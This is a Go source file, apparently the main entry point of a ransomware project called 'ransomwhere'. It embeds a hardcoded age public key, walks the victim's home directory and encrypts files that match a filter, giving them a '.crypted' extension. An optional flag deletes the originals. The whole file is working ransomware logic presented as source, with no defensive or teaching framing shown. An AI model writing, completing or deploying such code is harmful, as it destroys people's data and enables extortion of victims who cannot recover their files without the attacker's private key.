package main

import (
	"filippo.io/age"
	"flag"
	"github.com/sirupsen/logrus"
	"ransomwhere/pkg/crypto"
	"ransomwhere/pkg/file"
	"strings"
)

const (
	pubKey   = "age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p"
	cryptExt = ".crypted"
)

func main() {
	logger := logrus.New()
	logger.SetLevel(logrus.ErrorLevel)

	logLevel := flag.String("log", "error", "The log level to use.")
	deleteFiles := flag.Bool("delete", false, "Delete files after encrypting.")
	flag.Parse()

	logrusLevel, err := logrus.ParseLevel(*logLevel)
	if err != nil {
		logger.WithField("log_level", *logLevel).Error("unknown log level")
		logrusLevel = logrus.ErrorLevel
	} else {
		logrus.SetLevel(logrusLevel)
	}

	cryptRecipients, err := age.ParseRecipients(strings.NewReader(pubKey))
	if err != nil {
		logger.WithError(err).WithField("pubKey", pubKey).Fatal("could not parse public key")
	}

	if err := file.WalkFiles(file.GetHomeDirectoryWithFallback(), logger, func(name, path string) error {
		fileLogger := logger.WithField("path", path).WithField("name", name)

		if !file.MatchFile(name) {
			return nil
		}

		if err := crypto.EncryptFile(fileLogger, path, cryptExt, cryptRecipients, *deleteFiles); err != nil {
			fileLogger.WithError(err).Error("could not crypt file")
		}

		return nil
	}); err != nil {
		logger.WithError(err).Fatal("could not run walker")
	}
}
